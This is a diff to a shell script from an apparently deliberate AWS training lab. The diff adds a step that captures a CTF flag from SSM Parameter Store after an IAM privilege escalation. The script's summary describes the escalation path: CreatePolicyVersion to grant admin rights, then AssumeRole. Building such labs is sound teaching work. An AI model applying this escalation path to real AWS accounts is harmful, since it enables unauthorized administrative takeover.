@@ -302,12 +302,29 @@ else
 fi
 echo ""
 
+# [EXPLOIT]
+# Step 11: Capture the CTF flag
+# The assumed target role holds AdministratorAccess (via the modified policy), which grants
+# ssm:GetParameter implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-016-to-admin"
+show_attack_cmd "Attacker (as target-role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (no admin permissions)"
@@ -315,9 +332,11 @@ echo "2. Used iam:CreatePolicyVersion to create v2 of $TARGET_POLICY with admin 
 echo "3. Policy version v2 automatically became the default version"
 echo "4. Used sts:AssumeRole to assume $TARGET_ROLE (which has the policy attached)"
 echo "5. Achieved: Full administrative access to the AWS account"
+echo "6. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (CreatePolicyVersion) → $TARGET_POLICY v2 → (AssumeRole) → $TARGET_ROLE → Administrator"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
